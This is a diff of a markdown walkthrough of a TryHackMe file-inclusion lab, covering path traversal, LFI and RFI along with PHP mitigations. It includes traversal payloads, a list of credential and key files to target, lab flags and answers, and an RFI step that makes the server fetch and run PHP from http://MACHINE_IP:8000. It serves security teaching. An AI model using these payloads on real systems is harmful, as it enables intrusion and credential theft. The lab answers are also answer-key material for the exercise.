@@ -40,7 +40,7 @@ By default, an attacker can leverage file inclusion vulnerabilities to leak data
 **Path Traversal**
 Also known as \`Directory traversal\`, a web security vulnerability allows an attacker to read operating system resources, such as local files on the server running an application. The attacker exploits this vulnerability by manipulating and abusing the web application's URL to locate and access files or directories stored outside the application's root directory.
 
-Path traversal vulnerabilities occur when the user's input is passed to a function such as file_get_contents in PHP. It's important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability. In PHP, you can use the file_get_contents to read the content of a file. You can find more information about the function <a href="https://www.php.net/manual/en/function.file-get-contents.php">here</a>.
+Path traversal vulnerabilities occur when the user's input is passed to a function such as file\_get\_contents in PHP. It's important to note that the function is not the main contributor to the vulnerability. Often poor input validation or filtering is the cause of the vulnerability. In PHP, you can use the file\_get\_contents to read the content of a file. You can find more information about the function <a href="https://www.php.net/manual/en/function.file-get-contents.php">here</a>.
 
 The following graph shows how a web application stores files in \`/var/www/app\`. The happy path would be the user requesting the contents of userCV.pdf from a defined path \`/var/www/app/CVs\`.
 <img src="/blogs/tryhackme/file-inclusion/45d9c1baacda290c1f95858e27f740c9.png">
@@ -66,10 +66,10 @@ Location | Description
 \`/proc/version\` | specifies the version of the Linux kernel
 \`etc/passwd\` | has all registered users that have access to a system
 \`/etc/shadow\` | contains information about the system's users' passwords
-\`/root/.bash_history\` | contains the history commands for \`root\` user
+\`/root/.bash\_history\` | contains the history commands for \`root\` user
 \`/var/log/dmessage\` | contains global system messages, including the messages that are logged during system startup
 \`/var/mail/root\` | all emails for \`root\` user
-\`/root/.ssh/id_rsa\` | Private SSH keys for a root or any known valid user on the server
+\`/root/.ssh/id\_rsa\` | Private SSH keys for a root or any known valid user on the server
 \`/var/log/apache2/access.log\` | the accessed requests for \`Apache\` web server
 \`C:\\boot.ini\` | contains the boot options for computers with BIOS firmware
 [/table]
@@ -77,21 +77,21 @@ Location | Description
 **Answer the questions below**⸻⸻⸻⸻⸻
 
 What function causes path traversal vulnerabilities in PHP?
-**Answer:** file_get_contents
+**Answer:** file\_get\_contents
 
 ⸻⸻⸻⸻⸻
 
 ### Task 4 Local File Inclusion - LFI
 
 **Local File Inclusion (LFI)**
-LFI attacks against web applications are often due to a developers' lack of security awareness. With PHP, using functions such as \`include\`, \`require\`, \`include_once\`, and \`require_once\` often contribute to vulnerable web applications. In this room, we'll be picking on PHP, but it's worth noting LFI vulnerabilities also occur when using other languages such as ASP, JSP, or even in Node.js apps. LFI exploits follow the same concepts as path traversal.
+LFI attacks against web applications are often due to a developers' lack of security awareness. With PHP, using functions such as \`include\`, \`require\`, \`include\_once\`, and \`require\_once\` often contribute to vulnerable web applications. In this room, we'll be picking on PHP, but it's worth noting LFI vulnerabilities also occur when using other languages such as ASP, JSP, or even in Node.js apps. LFI exploits follow the same concepts as path traversal.
 
 In this section, we will walk you through various \`LFI\` scenarios and how to exploit them.
 
 **#1.** Suppose the web application provides two languages, and the user can select between the \`EN\` and \`AR\`.
 \`\`\`
 <?PHP 
-	include($_GET["lang"]);
+	include($\_GET["lang"]);
 ?>
 \`\`\`
 
@@ -104,7 +104,7 @@ In this case, it works because there isn't a directory specified in the include 
 **#2.** Next, in the following code, the developer decided to specify the directory inside the function.
 \`\`\`
 <?PHP 
-	include("languages/". $_GET['lang']); 
+	include("languages/". $\_GET['lang']); 
 ?>
 \`\`\`
 
@@ -185,12 +185,12 @@ Give Lab #3 a try to read **/etc/passwd**. What is the request look like?
 **Answer:** /lab3.php?file=../../../../etc/passwd%
 
 Which function is causing the directory traversal in Lab #4?
-**Answer:** file_get_contents
+**Answer:** file\_get\_contents
 
 Try out Lab #6 and check what is the directory that has to be in the input field?
 **Answer:** THM-profile
 
-Try out Lab #6 and read **/etc/os-release**. What is the **VERSION_ID** value?
+Try out Lab #6 and read **/etc/os-release**. What is the **VERSION\_ID** value?
 **Answer:** 12.04
 **Reason:** Use \`?file=THM-profile/../../../../etc/os-release%00\` on the link itself instead of using the lab page.
 
@@ -199,7 +199,7 @@ Try out Lab #6 and read **/etc/os-release**. What is the **VERSION_ID** value?
 ### Task 6 Remote File Inclusion - RFI
 
 **Remote File Inclusion - RFI**
-Remote File Inclusion (RFI) is a technique to include remote files into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into **include** function. One requirement for RFI is that the \`allow_url_fopen\` option needs to be \`on\`.
+Remote File Inclusion (RFI) is a technique to include remote files into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into **include** function. One requirement for RFI is that the \`allow\_url\_fopen\` option needs to be \`on\`.
 
 The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:
 - Sensitive Information Disclosure
@@ -225,7 +225,7 @@ As a developer, it's important to be aware of web application vulnerabilities, h
 1. Keep system and services, including web application frameworks, updated with the latest version.
 2. Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.
 3. A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.
-4. Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as \`allow_url_fopen\` on and \`allow_url_include\`.
+4. Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as \`allow\_url\_fopen\` on and \`allow\_url\_include\`.
 5. Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.
 6. Never trust user input, and make sure to implement proper input validation against file inclusion.
 7. Implement whitelisting for file names and locations as well as blacklisting.
@@ -257,14 +257,14 @@ Capture Flag1 at /etc/flag1
 5. Forward the request and the flag should show up.
 
 Capture Flag2 at /etc/flag2
-**Answer:** c00k13_i5_yuMmy1
+**Answer:** c00k13\_i5\_yuMmy1
 **Reason:**
 1. Go to Inspect on the browser and go to the Storage tab.
 2. Under the Cookies section, change the value of the cookie to the payload \`../../../../etc/flag2\` and we can see that the webpage automatically append \`.php\` to the end of the payload.
 3. We can change the payload to \`../../../../etc/flag2%00\` to nullify the \`.php\` and we can see the flag appear on the page.
 
 Capture Flag3 at /etc/flag3
-**Answer:** P0st_1s_w0rk1in9
+**Answer:** P0st\_1s\_w0rk1in9
 **Reason:**
 1. Open BurpSuite.
 2. On the browser, open the lab page and proxy server.
@@ -282,6 +282,6 @@ Gain RCE in **Lab #Playground** \`/playground.php\` with RFI to execute the \`ho
 print exec('hostname');
 ?>
 \`\`\`
-3. Go to the form on the lab page and enter in the payload \`http://MACHINE_IP:8000/payload.php\` and we can see that the flag appear on the page.
+3. Go to the form on the lab page and enter in the payload \`http://MACHINE\_IP:8000/payload.php\` and we can see that the flag appear on the page.
 `
 }
